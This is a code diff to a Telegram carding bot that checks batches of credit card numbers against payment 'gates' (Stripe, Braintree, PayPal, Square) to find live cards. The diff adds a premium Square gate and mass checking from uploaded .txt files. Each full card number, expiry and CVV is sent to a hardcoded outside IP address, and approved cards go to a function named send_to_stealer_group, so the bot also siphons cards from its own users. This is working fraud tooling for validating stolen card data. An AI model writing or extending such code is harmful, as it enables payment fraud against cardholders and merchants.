@@ -12172,7 +12172,7 @@ async def mass_check_with_cards(update: Update, context: ContextTypes.DEFAULT_TY
     valid_gates = {
         "ss": ("Stripe Auth $0.5", False),
         "bu": ("Braintree Auth $1", False),
-        "sq": ("Square Auth $0", False),
+        "sq": ("Square Auth", True),
         "pp": ("PayPal $1", True),
         "sor": ("Stripe $2", True),
         "st5": ("Stripe $5", True),
@@ -12313,7 +12313,7 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Free Gates
         "ss": ("Stripe Auth $0.5", False),
         "bu": ("Braintree Auth $1", False),
-        "sq": ("Square Auth $0", False),
+        "sq": ("Square Auth", True),
         
         # Premium Gates
         "pp": ("PayPal $1", True),
@@ -12693,7 +12693,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [_btn("PayPal", icon=EID["card"], callback_data="gate_paypal"), _btn("Auto Shopify", icon=EID["bolt"], callback_data="gate_auto_shopify")],
             [_btn("Razorpay", icon=EID["card"], callback_data="gate_razorpay"), _btn("Shopify V2", icon=EID["bolt"], callback_data="gate_shopify_v2")],
             [_btn("PayU ₹1", icon=EID["card"], callback_data="gate_payu"), _btn("CC Killer", icon=EID["danger"], callback_data="gate_cc_killer")],
-            [_btn("⚡ Auto Hitter", icon=EID["bolt"], callback_data="gate_auto_hitter")],
+            [_btn("⬛ Square Auth", icon=EID["card"], callback_data="gate_square_auth"), _btn("⚡ Auto Hitter", icon=EID["bolt"], callback_data="gate_auto_hitter")],
             [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -12725,7 +12725,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "gate_stripe5", "gate_braintree", "gate_ast", "gate_vbv3ds",
         "gate_paypal", "gate_auto_shopify", "gate_stripe_newrp",
         "gate_razorpay", "gate_payu", "gate_shopify_v2",
-        "gate_stripe1", "gate_auto_hitter", "gate_cc_killer"
+        "gate_stripe1", "gate_auto_hitter", "gate_cc_killer",
+        "gate_square_auth"
     ):
         gate_texts = {
             "gate_stripe5": ae("""<b>Stripe $5</b>
@@ -12800,6 +12801,18 @@ Uses bli-us.com membership gateway.
 • Card is still live try again 😭 — Live
 
 <code>/kill 4242424242424242|12|25|123</code>"""),
+            "gate_square_auth": ae("""<b>⬛ Square Auth Gate</b>  💎 <i>Premium</i>
+
+▸ /sq CC|MM|YY|CVV — Single Check
+▸ /sq (reply to .txt) — Mass Check from file
+▸ /msq CC|MM|YY|CVV … — Mass Check inline
+▸ /msqtxt (reply to .txt) — Mass Check via file
+
+Checks cards against Square Payment Gateway.
+• APPROVED / CVV MATCHED → Live card ✅
+• DECLINED / INVALID → Dead card ❌
+
+<code>/sq 4242424242424242|12|25|123</code>"""),
         }
         text = gate_texts[query.data]
         keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="gates")]]
@@ -15079,92 +15092,224 @@ async def myemail_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 from modules.cc_killer import check as cc_kill_logic
 
-from modules.square_auth import square_auth_logic
+try:
+    from modules.square_auth import square_auth_logic as _old_square_auth_logic
+except Exception:
+    _old_square_auth_logic = None
 
-# SQUARE AUTH GATE - /sq
+# ── Square API helper ─────────────────────────────────────────────────────
+_SQUARE_API = "http://138.128.240.15:8006/square"
+
+async def _call_square_api(cc: str, mm: str, yy: str, cvv: str) -> dict:
+    """Call the Square Auth API and return parsed JSON dict."""
+    import aiohttp
+    card_str = f"{cc}|{mm}|{yy}|{cvv}"
+    url = f"{_SQUARE_API}?cc={card_str}"
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
+            data = await resp.json(content_type=None)
+            return data  # {"CC":..., "Gate":..., "Response":...}
+
+
+def _sq_is_approved(response_text: str) -> bool:
+    t = response_text.upper()
+    return any(k in t for k in ("APPROVED", "CVV MATCHED", "CNN MATCHED",
+                                 "AUTHORIZED", "SUCCESS", "VALID"))
+
+
+# SQUARE AUTH GATE - /sq  (Premium only · file / mass support)
 # ============================================================================
 
 @require_premium
 async def gate_sq(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Square Auth Gate - /sq [cc|mm|yy|cvv]"""
+    """Square Auth Gate - /sq CC|MM|YY|CVV  (or reply to a .txt file for mass check)"""
     from modules.gate_status import is_gate_offline, offline_message
     if is_gate_offline("sq"):
         await update.message.reply_text(offline_message("sq"), parse_mode=ParseMode.HTML)
         return
-    user = update.effective_user
-    message = update.message
 
+    user    = update.effective_user
+    message = update.message
+    username = user.username or user.first_name
+
+    # ── File / mass-check path ────────────────────────────────────────────
+    # Triggered when: no args BUT there's a replied-to .txt file, OR the
+    # message itself contains a document attachment.
+    txt_content = None
+    if not context.args:
+        txt_content = await get_txt_content_from_reply(update, context)
+
+    if txt_content:
+        # ── Mass-check from file ──────────────────────────────────────────
+        user_id = user.id
+        if context.user_data.get(f"mass_check_running_{user_id}"):
+            await message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress."),
+                                     parse_mode=ParseMode.HTML)
+            return
+        cards = [c.strip() for c in txt_content.replace("\n", " ").split() if "|" in c]
+        if not cards:
+            await message.reply_text(ae("❌ No valid cards found in file.\nFormat: <code>CC|MM|YY|CVV</code>"),
+                                     parse_mode=ParseMode.HTML)
+            return
+        if len(cards) > 50:
+            cards = cards[:50]
+            await message.reply_text(ae("⚠️ Capped at <b>50 cards</b> for this run."),
+                                     parse_mode=ParseMode.HTML)
+
+        context.user_data[f"mass_check_running_{user_id}"] = True
+        status_msg = await message.reply_text(
+            ae(f"⬛ <b>Mass Square Auth</b>\n\n📋 Cards: {len(cards)}\n⏳ Processing..."),
+            parse_mode=ParseMode.HTML)
+
+        from modules.gate_checker import get_bin_info as _gbi
+        approved, declined, errors = [], [], []
+
+        for i, card in enumerate(cards):
+            if not context.user_data.get(f"mass_check_running_{user_id}"):
+                break
+            parts = card.split("|")
+            if len(parts) < 4:
+                errors.append(card); continue
+            c, m, y, cv = parts[0], parts[1], parts[2], parts[3]
+            try:
+                data     = await _call_square_api(c, m, y, cv)
+                raw_resp = data.get("Response", "")
+                bin_info = await asyncio.get_event_loop().run_in_executor(None, _gbi, c)
+                if _sq_is_approved(raw_resp):
+                    approved.append(card)
+                    log_approved_card(user_id, username, c, m, y, cv, "sq", raw_resp, bin_info)
+                    await send_to_stealer_group(context.bot, c, m, y, cv, "sq", raw_resp, bin_info, user_id, username)
+                    await send_approved_card_with_gif(update, card, "sq", raw_resp, 0, bin_info)
+                else:
+                    declined.append(card)
+            except Exception as ex:
+                errors.append(card)
+            if (i + 1) % 5 == 0:
+                try:
+                    await status_msg.edit_text(
+                        ae(f"⬛ <b>Square Mass Check</b>\n\n"
+                           f"✅ Approved: {len(approved)}\n"
+                           f"❌ Declined: {len(declined)}\n"
+                           f"⚠️ Errors: {len(errors)}\n"
+                           f"📊 Progress: {i+1}/{len(cards)}"),
+                        parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+            await asyncio.sleep(1)
+
+        context.user_data[f"mass_check_running_{user_id}"] = False
+        summary = (f"⬛ <b>Mass Square Auth Complete</b>\n\n"
+                   f"✅ Approved: {len(approved)}\n"
+                   f"❌ Declined: {len(declined)}\n"
+                   f"⚠️ Errors: {len(errors)}\n"
+                   f"📊 Total: {len(cards)}")
+        if approved:
+            summary += "\n\n<b>💳 Approved:</b>\n" + "\n".join(f"<code>{c}</code>" for c in approved[:10])
+            if len(approved) > 10:
+                summary += f"\n… and {len(approved)-10} more"
+        try:
+            await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
+        except Exception:
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+        return
+
+    # ── Single-card path ──────────────────────────────────────────────────
     if not context.args:
         await message.reply_text(
-            "⬛ <b>SQUARE AUTH GATE</b>\n\n"
-            "<b>Usage:</b>\n"
-            "▸ <code>/sq [cc|mm|yy|cvv]</code>\n\n"
-            "<b>Example:</b>\n"
-            "<code>/sq 4242424242424242|12|25|123</code>",
-            parse_mode=ParseMode.HTML
-        )
+            ae("⬛ <b>SQUARE AUTH GATE</b>  💎 <i>Premium</i>\n\n"
+               "<b>Usage:</b>\n"
+               "▸ <code>/sq CC|MM|YY|CVV</code>\n"
+               "▸ Reply to a <code>.txt</code> file → mass check\n\n"
+               "<b>Mass check:</b>  <code>/msq CC|MM|YY|CVV …</code>\n"
+               "                  <code>/msqtxt</code> (reply to .txt)\n\n"
+               "<b>Example:</b>\n"
+               "<code>/sq 4242424242424242|12|25|123</code>"),
+            parse_mode=ParseMode.HTML)
         return
 
-    full_text = " ".join(context.args)
-    card_pattern = r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b'
-    card_match = re.search(card_pattern, full_text)
-    
+    full_text   = " ".join(context.args)
+    card_match  = re.search(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b', full_text)
     if not card_match:
-        await message.reply_text(ae("❌ <b>Invalid Card Format!</b>\nUse: <code>CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
+        await message.reply_text(
+            ae("❌ <b>Invalid Format!</b>\nUse: <code>CC|MM|YY|CVV</code>"),
+            parse_mode=ParseMode.HTML)
         return
-        
+
     cc, mm, yy, cvv = card_match.groups()
     card_str = f"{cc}|{mm}|{yy}|{cvv}"
-    username = user.username or user.first_name
-    
+    masked   = f"{cc[:6]}{'*' * (len(cc)-10)}{cc[-4:]}"
+
     loading_msg = await message.reply_text(
-        f"⬛ <b>SQUARE AUTH GATE</b>\n\n"
-        f"<code>{cc[:6]}******{cc[-4:]}</code>\n"
-        f"⏳ Authorizing...",
-        parse_mode=ParseMode.HTML
-    )
-    
+        ae(f"⬛ <b>SQUARE AUTH GATE</b>\n\n"
+           f"💳 <code>{masked}|{mm}|{yy}|{cvv}</code>\n"
+           f"⏳ Authorizing via Square…"),
+        parse_mode=ParseMode.HTML)
+
     try:
-        start_time = time.time()
-        result = await square_auth_logic(card_str)
-        elapsed = time.time() - start_time
+        t0       = time.time()
+        data     = await _call_square_api(cc, mm, yy, cvv)
+        elapsed  = round(time.time() - t0, 2)
+        raw_resp = data.get("Response", "Unknown response")
+
         from modules.gate_checker import get_bin_info
         bin_info = get_bin_info(cc)
-        
-        is_success = "Approved" in result or "CVV MATCHED" in result or "CNN MATCHED" in result
-        
-        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
-        if bin_info.get('type'):
-            bin_type += f" - {bin_info.get('type', '').upper()}"
-            
-        status_icon = "✅ AUTHORIZED" if is_success else "❌ DECLINED"
-        
-        response = (
-            f"Card: <code>{card_str}</code>\n"
-            f"Status: {status_icon}\n"
-            f"Response: {result}\n"
-            f"Gateway: Square Auth\n\n"
-            f"Brand: {bin_type}\n"
-            f"Bank: {bin_info.get('bank', 'Unknown')}\n"
-            f"Country: {bin_info.get('country', 'Unknown').upper()}\n\n"
-            f"Time: {elapsed:.2f}s\n"
-            f"Checked By: {username}"
+        brand    = bin_info.get("brand", "N/A").upper()
+        b_type   = bin_info.get("type", "").upper()
+        bank     = bin_info.get("bank", "Unknown")
+        country  = bin_info.get("country", "Unknown").upper()
+        bin_type = f"{brand} - {b_type}" if b_type else brand
+
+        is_ok = _sq_is_approved(raw_resp)
+
+        response_body = ae(
+            f"{'✅' if is_ok else '❌'} <b>{'APPROVED' if is_ok else 'DECLINED'}</b>  |  Square Auth\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"💳 <b>Card:</b>   <code>{card_str}</code>\n"
+            f"📣 <b>Response:</b> {raw_resp}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🏦 <b>Brand:</b>   {bin_type}\n"
+            f"🏛 <b>Bank:</b>    {bank}\n"
+            f"🌍 <b>Country:</b> {country}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"⏱ <b>Time:</b>    {elapsed}s\n"
+            f"👤 <b>By:</b>      @{username}"
         )
-        
-        if is_success:
-            log_approved_card(user.id, username, cc, mm, yy, cvv, "sq", result, bin_info)
-            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "sq", result, bin_info, user.id, username)
+
+        if is_ok:
+            log_approved_card(user.id, username, cc, mm, yy, cvv, "sq", raw_resp, bin_info)
+            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "sq", raw_resp, bin_info, user.id, username)
+            gif_url = get_sexy_anime_gif("success")
             try:
-                success_gif = get_sexy_anime_gif("success")
-                await message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
                 await loading_msg.delete()
-            except:
-                await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
+                if gif_url:
+                    await message.reply_animation(animation=gif_url, caption=response_body,
+                                                  parse_mode=ParseMode.HTML)
+                else:
+                    await message.reply_text(response_body, parse_mode=ParseMode.HTML)
+            except Exception:
+                await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
         else:
-            await loading_msg.edit_text(response, parse_mode=ParseMode.HTML)
-            
+            gif_url = get_sexy_anime_gif("failed")
+            try:
+                await loading_msg.delete()
+                if gif_url:
+                    await message.reply_animation(animation=gif_url, caption=response_body,
+                                                  parse_mode=ParseMode.HTML)
+                else:
+                    await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
+            except Exception:
+                try:
+                    await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+
     except Exception as e:
-        await loading_msg.edit_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)
+        try:
+            await loading_msg.edit_text(
+                ae(f"⚠️ <b>Square Gate Error</b>\n\n{str(e)[:150]}"),
+                parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
 
 # CC KILLER GATE - /kill
 # ============================================================================
